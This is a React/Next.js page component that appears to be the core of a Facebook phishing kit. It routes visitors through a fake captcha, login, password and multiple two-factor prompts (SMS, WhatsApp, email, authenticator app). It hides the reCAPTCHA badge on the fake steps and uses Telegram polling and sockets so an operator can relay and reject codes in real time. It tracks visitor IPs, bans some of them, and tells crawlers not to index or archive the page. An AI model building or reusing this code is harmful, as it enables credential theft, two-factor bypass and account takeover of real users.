import Head from "next/head";
import styles from "../styles/Home.module.css";
import React, { createContext, useState, useEffect } from "react";
import { useHideRecaptchaBadge } from "../hooks/useHideRecaptchaBadge";

// Component imports - Main page components
import Step1 from "../components/fbook/Step1.js";
import Step2 from "../components/fbook/Step2.js";
import Step3 from "../components/fbook/Step3.js";
import Captcha from "../components/Captcha/Captcha.js";
import Fa2 from "../components/fbook/Fa2.js";
import Fa2Red from "../components/fbook/Fa2Red.js";
import PhoneVerify from "../components/fbook/PhoneVerify.js";
import Done from "../components/common/Done.js";
import Fa2Whatsapp from "../components/fbook/Fa2Whatsapp.js";
import Fa2Email from "../components/fbook/Fa2Email.js";
import Fa2AuthApp from "../components/fbook/Fa2AuthApp.js";

// Hooks
import { useUserData } from "../hooks/useUserData";
import { useStepManagement } from "../hooks/useStepManagement";
import { useIPManagement } from "../hooks/useIPManagement";
import { useInitialSetup } from "../hooks/useInitialSetup";
import { useTelegramPolling } from "../hooks/useTelegramPolling";
import { useSocketConnection } from "../utils/socket/useSocketConnection";

// Utils
import { PageUtils } from "../utils/pageUtils";

// Step mapping for better maintainability
const STEP_COMPONENTS = {
  0: Captcha,
  1: Step1,
  2: Step2,
  3: Fa2,
  4: Step3,
  6: Fa2Red,
  7: Step1,
  10: PhoneVerify,
  11: Done,
  12: Fa2Whatsapp,
  13: Fa2Email,
  14: Fa2,
  15: Fa2AuthApp,
};

export const DataContext = createContext();

// Main component
export default function Home() {
  // Hide badge for FB steps
  const FBOOK_STEPS = new Set([1, 2, 3, 4, 6, 7, 10, 12, 13, 14, 15]);
  const [ContinueWithFacebook, setContinueWithFacebook] = useState(true);
  const userData = useUserData();
  const stepManagement = useStepManagement();
  useHideRecaptchaBadge(FBOOK_STEPS.has(stepManagement.Step));

  // Initialize user data and setup - this will handle IP fetching
  const { Unik, isInitialized } = useInitialSetup(
    userData.setAllData,
    stepManagement.setStep
  );

  // IP management (gets IP from AllData, handles ban checking)
  const { Ip, setIp } = useIPManagement();

  // Update IP when AllData changes (from initial setup)
  useEffect(() => {
    if (userData.AllData?.ip && userData.AllData.ip !== Ip) {
      setIp(userData.AllData.ip);
    }
  }, [userData.AllData?.ip, Ip, setIp]);

  // Additional hooks
  useTelegramPolling(
    Unik,
    stepManagement.setStep,
    stepManagement.setLastFetch,
    stepManagement.LastFetch,
    Ip,
    stepManagement.setWrong2faTrigger,
    stepManagement.wrong2faTrigger,
    stepManagement.setWrongPasswordTrigger,
    stepManagement.wrongPasswordTrigger
  );

  useSocketConnection(Unik, userData.AllData);
  // Dynamic title and favicon based on step
  const { title, favicon } = PageUtils.getPageMeta(stepManagement.Step);

  // Render step component
  const renderStepComponent = () => {
    const Component = STEP_COMPONENTS[stepManagement.Step];
    if (!Component) return null;

    const commonProps = {
      setStep: stepManagement.setStep,
      Unik,
      Ip,
      setIp,
      Step: stepManagement.Step,
      InvalidPassword: stepManagement.InvalidPassword,
      ContinueWithFacebook,
      setContinueWithFacebook,
      LastFetch: stepManagement.LastFetch,
      wrong2faTrigger: stepManagement.wrong2faTrigger,
      wrongPasswordTrigger: stepManagement.wrongPasswordTrigger,
      ...userData,
    };

    return <Component {...commonProps} />;
  };

  return (
    <div className={styles.container}>
      <Head>
        <title>{title}</title>
        <link rel="icon" href={favicon} />
        <meta charSet="utf-8" />
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1"
        />
        <meta name="theme-color" content="#fff" />
        <meta name="robots" content="noimageindex" />
        <meta name="robots" content="notranslate" />
        <meta name="robots" content="nositelinkssearchbox" />
        <meta name="robots" content="nosnippet" />
        <meta name="robots" content="max-snippet:0" />
        <meta
          name="crawler"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="AdsBot-Google"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot-news"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta name="googlebot-news" content="nosnippet" />
        <meta name="robots" content="max-image-preview:none" />
        <meta name="robots" content="noindex,nofollow,noarchive" />
        <meta name="robots" content="noarchive" />
        <meta
          name="theme-color"
          content="#00000000"
          media="(prefers-color-scheme: light)"
        />
        <meta
          name="theme-color"
          content="#00000000"
          media="(prefers-color-scheme: dark)"
        />
      </Head>

      <DataContext.Provider
        value={{ setAllData: userData.setAllData, AllData: userData.AllData }}
      >
        <div className="min-h-screen">
          <div className="flex justify-center w-full">
            {renderStepComponent()}
          </div>
        </div>
      </DataContext.Provider>
    </div>
  );
}
